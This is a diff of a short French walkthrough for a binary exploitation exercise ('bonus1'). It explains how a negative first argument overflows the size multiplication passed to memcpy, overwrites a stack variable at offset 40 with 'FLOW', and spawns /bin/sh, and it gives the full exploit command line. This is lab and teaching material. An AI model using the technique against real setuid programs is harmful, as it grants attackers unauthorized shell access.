@@ -1,8 +1,12 @@
-Il suffit de donner comme premier argument un nombre inferieur a 0 pour pouvoir overflow
+Le programme prend 2 arguments, et execute execl("/bin/sh"), si la valeur a esp+0x3c est egale a 0x574f4c46.
+Le premier argument donne la taille qui sera passee a memcpy. => memcpy(dest, argv[2], atoi(argv[1]) * 4)
+Il check si atoi(argv[1]) >= 9, on ne peut donc pas donner directement la valeur pour reecrire la variable desiree.
+On peut cependant envoyer un nombre negatif pour qu'il underflow et tombe sur un nombre negatif assez grand.
 
-On essaie ensuite de voir si on peut overflow la valeur a esp+0x3c
-C'est le cas, et ca correspond a 'KKKK' 
+On essaie d'abord de calculer la taille du buffer pour overflow sur la valeur a esp+0x3c (ces variables se suivent en memoire)
+On trouve un offset de 40, il faut donc envoyer dans le premier argument 11 au minimum ((40 + 4) / 4)
+Etant donne que (2147483647 - 2147483636) * 4, on peut simplement envoyer -2147483636.
 
 "\x46\x4c\x4f\x57" <- valeur du cmp reverse
 
-r -2147483631 $(python -c 'print("AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJ" + "\x46\x4c\x4f\x57" + "LLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ")')
+./bonus1 -2147483636 $(python -c 'print("A"*40 + "\x46\x4c\x4f\x57")')
